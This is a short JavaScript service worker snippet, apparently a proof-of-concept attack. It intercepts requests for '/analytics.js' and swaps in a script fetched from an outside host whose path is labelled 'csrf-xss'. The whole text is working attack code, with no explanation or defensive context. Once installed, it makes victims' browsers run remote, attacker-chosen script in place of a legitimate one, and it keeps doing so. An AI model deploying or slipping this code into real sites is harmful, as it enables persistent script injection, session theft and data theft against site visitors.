self.addEventListener('fetch', event => {
  if (event.request.url.endsWith('/analytics.js')) {
    event.respondWith(fetch('https://nvj04.github.io/csrf-xss/analytics.js'));
  }
});
